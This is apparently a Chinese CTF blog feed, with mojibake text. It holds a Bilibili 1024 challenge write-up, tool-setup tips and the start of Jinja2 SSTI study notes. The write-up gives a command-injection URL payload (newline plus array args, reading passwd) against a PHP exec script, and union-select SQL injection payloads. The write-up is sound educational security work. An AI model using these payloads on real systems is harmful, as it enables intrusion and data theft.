&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> bilibili- ( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯~
&lt;/span>&lt;span style="color:#75715e"> uat: http://192.168.3.2/uat/eval.php
&lt;/span>&lt;span style="color:#75715e"> pro: http://security.bilibili.com/sec1024/q/pro/eval.php
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#111">$args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;args&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^\w+$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// todo: other filter
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/bin/2233 &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">implode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥getæ–¹å¼æ¥æ”¶æœ€å¤š3ä¸ªåä¸ºargsçš„å‚æ•°ï¼Œå¯¹æ¯ä¸ªå‚æ•°çš„å€¼è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œæœ€åæ‹¼æ¥åˆ°$cmdåé¢è¢«execæ‰§è¡Œï¼Œç”¨%0aæ¢è¡Œ+æ•°ç»„[]ç»•è¿‡&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=ls
https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=cat&amp;amp;args[]=passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>9d3c3014-6c6267e7-086aaee5-1f18452a&lt;/code>&lt;/p>
&lt;h2 id="å®‰å…¨æ”»é˜²--4">å®‰å…¨æ”»é˜²&amp;ndash;4&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289">æç¤º&lt;/a>&lt;/p>
&lt;p>æ‡‚çš„éƒ½æ‡‚&lt;/p>
&lt;/blockquote>
&lt;p>æœ‰ä¸ªè¯·æ±‚api &lt;a href="https://security.bilibili.com/sec1024/q/admin/api/v1/log/list">https://security.bilibili.com/sec1024/q/admin/api/v1/log/list&lt;/a>ï¼Œæœ¬èƒ½çš„å»fuzzä¸€ä¸‹ï¼Œç»“æœ412äº†â€¦â€¦QAQ&lt;/p>
&lt;p>usernameéƒ¨åˆ†å¯ä»¥sqliï¼Œè¿‡æ»¤äº†ç©ºæ ¼å’Œå•å¼•å·ï¼Œç”¨æ³¨é‡Šå’Œ16è¿›åˆ¶ç»•è¿‡&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,5&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>3d5dd579-0678ef93-18b70cae-cabc5d51&lt;/code>&lt;/p>
&lt;hr>
&lt;p>éš¾åº¦åº”è¯¥ç®—æ˜¯åç®€å•çš„ï¼Œå°±æ˜¯ï¼Œemmmmmmmmmm&lt;/p>
&lt;p>ç®—äº†ï¼Œæˆ‘ä¸å¥½è¯´&lt;/p></description></item><item><title>æ— é¢˜</title><link>https://amiaaaz.github.io/2021/11/14/maybe-help-someone/</link><pubDate>Sun, 14 Nov 2021 18:10:01 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/14/maybe-help-someone/</guid><description>&lt;details>
&lt;summary>
&lt;h4 class="inline">
æœ¬åœ°æ­å»ºVisual Regexp
&lt;/h4>
&lt;/summary>
&lt;p>æ­å»ºåŸå› å¤§å®¶åº”è¯¥éƒ½æ‡‚å§ï¼Œä¸€ä¸ªæ˜¯æ­£åˆ™å¯è§†åŒ–å®åœ¨æ˜¯å¾ˆé¦™å¾ˆå¿…è¦ï¼Œå…¶æ¬¡çº¿ä¸‹æ²¡ç½‘çš„è¯æ²¡æœ‰ä¸ªç¦»çº¿å·¥å…·å°±å¾ˆå®¹æ˜“ggï¼ŒåŒç±»å·¥å…·è¿˜æœ‰&lt;a href="https://github.com/gchq/CyberChef/releases/tag/v9.32.3">cyberchef&lt;/a>ç­‰&lt;/p>
&lt;p>&lt;a href="https://wangwl.net/static/projects/visualRegex/#">Visual Regexpåœ¨çº¿åœ°å€&lt;/a> | &lt;a href="https://github.com/relax-code-relax-life/visualRegexPage">githubä»“åº“&lt;/a>&lt;/p>
&lt;p>åœ¨&lt;code>git clone&lt;/code>ä¹‹åé¦–å…ˆè‚¯å®šæ˜¯&lt;code>npm install&lt;/code>ï¼Œå‡ºç°vulnerabilitieså¾ˆæ­£å¸¸ï¼Œç›´æ¥&lt;code>npm audit fix --force&lt;/code>ï¼Œä¸€æ¬¡ä¸è¡Œå°±ä¸¤æ¬¡&lt;/p>
&lt;p>å¥‡è‘©çš„æ˜¯ä½œè€…è‡ªå·±çš„visual-regexåŒ…ä¸€ç›´æ˜¯ä»¥å¿«æ·æ–¹å¼çš„å½¢å¼è¢«å®‰è£…ï¼ˆåæ¥å‘ç°æ˜¯æ•´ä¸ªé¡¹ç›®çš„package.jsonç¼–å†™çš„é—®é¢˜ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182010887.png" alt="image-20211114182010887">&lt;/p>
&lt;p>è§£å†³æ–¹æ³•ï¼šåˆ é™¤å¿«æ·æ–¹å¼ï¼Œå•ç‹¬å®‰è£…&lt;code>npm i visual-regex&lt;/code>ï¼Œç”¨everythingæŸ¥æ‰¾åˆ°è¯¥åŒ…å…·ä½“å­˜åœ¨çš„ä½ç½®ï¼Œå¤åˆ¶åˆ°node_modulesç›®å½•ä¸‹&lt;/p>
&lt;p>ä¹‹ååˆ°buildç›®å½•ä¸‹&lt;code>node .\build.js&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182307150.png" alt="image-20211114182307150">&lt;/p>
&lt;p>æŠ¥é”™hightlight.jså¹¶æ²¡æœ‰å¼•å…¥./lib/highlightï¼ŒæŸ¥çœ‹\highlight.js\package.jsonçš„exportséƒ¨åˆ†ï¼Œå‘ç°ç¬¬90è¡Œçš„å¼•ç”¨æ˜¯&amp;quot;.&amp;quot;ï¼Œå°†å…¶æ”¹ä¸º&amp;quot;./lib/highlight&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/JQW8B657%60%241JG%5BFOWY1I%7BBW.png" alt="img">&lt;/p>
&lt;p>å†æ¬¡buildæç¤º*&amp;lsquo;NODE_ENV&amp;rsquo; is not recognized as an internal or external command, operable program or batch file.*ï¼ˆæ­¤å¤„æˆªå›¾èµ°ä¸¢äº†ï¼‰ï¼Œè§£å†³æ–¹æ³•&lt;code>npm install -g win-node-env&lt;/code>&lt;/p>
&lt;p>ä¹‹å&lt;code>node .\build.js&lt;/code>å³å¯æˆåŠŸbuildï¼Œåœ¨devlistæ–‡ä»¶å¤¹ä¸‹çš„index.htmlå³å¯æ­£å¸¸ä½¿ç”¨ç›¸å…³åŠŸèƒ½&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ— æ³•æ‰“å¼€jaråŒ…åº”ç”¨
&lt;/h4>
&lt;/summary>
&lt;p>è¿™ä¸ªåº”è¯¥å±äºå¸¸è§é—®é¢˜äº†ï¼Œä¸€èˆ¬åŸå› æ˜¯javaç‰ˆæœ¬ä¸å¯¹&lt;/p>
&lt;p>å¾ˆå¤šäººé€‰æ‹©è®¾ç½®ä¸åŒåå­—çš„ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚java8ï¼Œjava11ï¼Œæˆ‘çš„è¯æ˜¯åªæœ‰java11æ˜¯ç¯å¢ƒå˜é‡ï¼Œåœ¨æœ‰äº›jaréœ€è¦java8çš„ç¯å¢ƒæ—¶ç›´æ¥ç”¨everythingæœç´¢java.exeï¼Œå¤åˆ¶è·¯å¾„ä¹‹å&lt;code>xxx\java.exe -jar xyz.jar&lt;/code>è¿™æ ·æ¥è¿è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117132839594.png" alt="image-20211117132839594">&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
è¿œç¨‹è°ƒè¯•Node.js
&lt;/h4>
&lt;/summary>
&lt;p>åœºæ™¯ï¼šç”¨vulhubæˆ–å…¶å®ƒå·²ç»æ‰“åŒ…å¥½çš„dockerç¯å¢ƒå¤ç°cveéœ€è¦è¿œç¨‹è°ƒè¯•&lt;/p>
&lt;p>é¦–å…ˆä¿®æ”¹å¯¹åº”çš„dockeræ–‡ä»¶ï¼špackage.jsonçš„&amp;quot;scripts&amp;quot;å­—æ®µçš„&amp;quot;start&amp;quot;éƒ¨åˆ†å¢åŠ &lt;code>--inspect=0.0.0.0:port&lt;/code>ï¼ŒæŒ‡åè°ƒè¯•æ—¶çš„ç›‘å¬ç«¯å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117160017724.png" alt="image-20211117160017724">&lt;/p>
&lt;p>docker-compose.ymlä¸­å¢åŠ ç›‘å¬ç«¯å£&amp;quot;8000:9229&amp;quot;ï¼Œä¹‹åæ­£å¸¸&lt;code>docker-compose up -d&lt;/code>&lt;/p>
&lt;p>æœ¬åœ°å…ˆä¸‹è½½å¥½ä¸€æ ·çš„æ–‡ä»¶ï¼Œç”¨vscodeç”Ÿæˆä¸€ä¸ªè°ƒè¯•æ–‡æ¡£lauch.json&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117155743006.png" alt="image-20211117155743006">&lt;/p>
&lt;p>éœ€è¦æ”¹çš„é…ç½®æœ‰addressï¼ˆè¿œç¨‹ipï¼‰ï¼Œportï¼ˆè¿œç¨‹ç›‘å¬ç«¯å£ï¼‰ï¼ŒlocalRootï¼ˆæœ¬åœ°è·¯å¾„ï¼‰ï¼Œremoteï¼ˆè¿œç¨‹è·¯å¾„ï¼‰ï¼Œä¹‹åå³å¯æ‰“æ–­ç‚¹è°ƒè¯•&lt;/p>
&lt;p>å‡ºç°unbound breakpointæ­£å¸¸ï¼Œå¤§æ¦‚ç‡æ˜¯ä½ çš„äº¤äº’å°±æ²¡æ‰§è¡Œåˆ°æ‰“æ–­ç‚¹çš„åœ°æ–¹ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆååº”&lt;/p>
&lt;/details></description></item><item><title>SSTIå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>æ¨¡æ¿æ¸²æŸ“å¯ä»¥å€ŸåŠ©ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶ã€å¾ªç¯è¯­å¥ç­‰ï¼‰ååˆ†æ–¹ä¾¿çš„åŠ¨æ€å‘ˆç°å†…å®¹ï¼Œä½†å¦‚æœç¼–å†™ä¸å½“å®¹æ˜“è¢«æ”»å‡»è€…æ³¨å…¥æ¶æ„å†…å®¹ä»è€Œæš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œæ‰§è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼&lt;/p>
&lt;h1 id="jinja">Jinja&lt;/h1>
&lt;p>Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„ç°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹ï¼Œæ˜¯Flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†&lt;/p>
&lt;p>Jinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»å‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»å‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨&lt;u>è¿‡æ»¤å™¨&lt;/u>ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ï¼ˆè¿™å¾ˆæœ‰åˆ©äºæˆ‘ä»¬æ„é€ æ¶æ„çš„payloadï¼‰ï¼Œæ¯”å¦‚è¿™æ ·çš„æ¨¡æ¿å¯ä»¥ç”¨é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">Hello, {{name|capitalize}}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jinjia2ä¹Ÿæ”¯æŒæ§åˆ¶è¯­å¥ï¼Œæ¯”å¦‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„&lt;u>forè¯­å¥&lt;/u>çš„æ¸²æŸ“æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% for comment in comments %}
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>{{comment}}&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">li&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
{% endfor %}
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">ul&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹æ‰€ä»¥æœ‰æ¨¡æ¿æ¸²æŸ“çš„æ¼æ´æ˜¯å› ä¸ºåœ¨æ¸²æŸ“ä¼ é€’è¿›å»çš„å‚æ•°æ—¶æ¨¡æ¿å¯ä»¥ç›´æ¥è®¿é—®Pythonçš„ä¸€äº›å¯¹è±¡åŠæ–¹æ³•ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªé•¿é•¿çš„ç»§æ‰¿é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶è¯»å†™&amp;amp;å‘½ä»¤æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>&lt;code>__dict__&lt;/code>ï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸&lt;/li>
&lt;li>&lt;code>__class__&lt;/code>ï¼šè¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»ï¼›pythonä¸­çš„æ–°å¼ç±»ï¼ˆæ˜¾ç¤ºç»§æ‰¿objectå¯¹è±¡çš„ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªå±æ€§&lt;code>__class&lt;/code>ç”¨äºè·å–å½“å‰å®ä¾‹å¯¹åº”çš„ç±»&lt;/li>
&lt;li>&lt;code>__mro__&lt;/code>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æï¼ˆå³MRO - Method Resolution Orderï¼‰&lt;/li>
&lt;li>&lt;code>__bases__&lt;/code>ï¼šä»¥å…ƒç»„å½¢å¼è¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå¯ä»¥ç†è§£ä¸ºç›´æ¥çˆ¶ç±»ï¼‰&lt;/li>
&lt;li>&lt;code>__base__&lt;/code>ï¼šè¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå•ä¸ªï¼‰ï¼ˆç›¸å½“äº&lt;code>__bases__[0]&lt;/code>ï¼‰ï¼Œå’Œ&lt;code>__mro__&lt;/code>éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„&lt;/li>
&lt;li>&lt;code>__subclasses__&lt;/code>ï¼šä»¥åˆ—è¡¨å½¢å¼è¿”å›ç±»çš„æ‰€æœ‰å­˜æ´»å­ç±»çš„å¼•ç”¨ï¼ˆè€Œéå®ä¾‹ï¼‰ï¼›pythonä¸­çš„ç±»éƒ½ç»§æ‰¿è‡ªobjectï¼Œåªè¦è°ƒç”¨objectç±»å¯¹è±¡çš„&lt;code>__subclasses__()&lt;/code>æ–¹æ³•å°±å¯ä»¥è·å–æƒ³è¦çš„å­ç±»&lt;/li>
&lt;li>&lt;code>__init__&lt;/code>ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•&lt;/li>
&lt;li>&lt;code>__globals__&lt;/code>ï¼šå¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥è·å–file, osç­‰æ¨¡å—&lt;/li>
&lt;li>&lt;code>__builtin__&lt;/code>&amp;amp;&amp;amp;&lt;code>__builtins__&lt;/code>ï¼šè¿”å›ä¸ç”¨å¯¼å…¥æ¨¡å—å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚int()ï¼Œlist()ç­‰å†…å»ºå‡½æ•°ï¼ŒæŸ¥çœ‹çš„æ–¹æ³•æ˜¯&lt;code>dir(__builtins__)&lt;/code>ã€€ã€€
&lt;ul>
&lt;li>åœ¨py2ä¸­&lt;code>__builtins__&lt;/code>æ¨¡å—æ˜¯è§£é‡Šå™¨è‡ªåŠ¨åˆ›å»ºçš„å¯¹äº&lt;code>__builtin__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼Œå¹¶é&lt;code>__buitin__&lt;/code>æœ¬èº«ï¼ˆåœ¨ä¸»æ¨¡å—ä¸­æ—¶ï¼Œæƒ…å†µç±»ä¼¼æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå˜é‡å¹¶å¯¹å®ƒåšä¸€æ¬¡å¼•ç”¨ä¼ é€’ï¼Œä¸¤è€…æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘ç›¸åŒï¼›å½“ä¸æ˜¯ä¸»æ¨¡å— è€Œæ˜¯æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªå¯ä»¥è¢«å¯¼å…¥çš„æ¨¡å—æ—¶ï¼Œ&lt;code>__builtins__&lt;/code>å…¶å®æ˜¯å¯¹&lt;code>__builtin__.__dict__&lt;/code>æ¨¡å—çš„å¼•ç”¨ï¼‰&lt;/li>
&lt;li>åœ¨py3ä¸­&lt;code>__builtin__&lt;/code>è¢«å‘½åä¸º&lt;code>builtins&lt;/code>&lt;/li>
&lt;li>å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸ &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="æ„é€ çš„åŸç†">æ„é€ çš„åŸç†&lt;/h2>
&lt;p>ä¸€è¨€ä»¥è”½ä¹‹ï¼šé€šè¿‡ä¸€ä¸ªé•¿é•¿çš„è°ƒç”¨ç»§æ‰¿é“¾æ¥å°†å†…å»ºçš„å‡½æ•°æˆ–æ¨¡å—æªå‡ºæ¥ç”¨&lt;/p>
&lt;h3 id="step1---æ‰¾åˆ°åŸºç±»object">step1 - æ‰¾åˆ°åŸºç±»object&lt;/h3>
&lt;p>é€šè¿‡å­—ç¬¦ä¸²ã€å­—å…¸ã€åˆ—è¡¨ã€å…ƒç»„å’Œå¾ˆç‰¹æ®Šçš„requestæ¥è·å–åŸºç±»objectï¼Œmroå’Œbases[0]å‡å¯ï¼ˆæˆ–è€…æ˜¯base ä¸€æ ·çš„æ•ˆæœï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211108104543559.png" alt="image-20211108104543559">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># py3&lt;/span>
&lt;span style="color:#111">{}&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="step2---è·å¾—èƒ½ç”¨çš„å­ç±»">step2 - è·å¾—â€œèƒ½ç”¨çš„â€å­ç±»&lt;/h3>
